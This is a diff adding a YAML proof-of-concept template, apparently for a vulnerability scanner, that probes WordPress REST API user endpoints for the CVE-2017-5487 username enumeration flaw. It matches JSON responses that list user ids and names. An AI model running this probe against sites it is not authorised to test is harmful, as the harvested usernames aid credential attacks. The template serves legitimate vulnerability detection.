@@ -1,0 +1,20 @@
+id: poc-yaml-wordpress-plugin-core-username-enumeration
+info:
+  name: WordPress Core 用户名枚举漏洞(CVE-2017-5487)
+  severity: medium
+  tags:
+  - 信息泄露
+  - CVE-2017-5487
+  finger: wordpress
+variables:
+  paths: 'wp-json/wp/v2/users/
+
+    ?rest_route=/wp/v2/users/
+
+    '
+requests:
+- method: GET
+  path: /{{.paths}}
+  expression: status_code == 200 && contains(body,"\"id\":") && contains(body,"\"name\":")
+    && contains(body,"\"avatar_urls\":") && contains(content_type,"application/json")
+transport: http
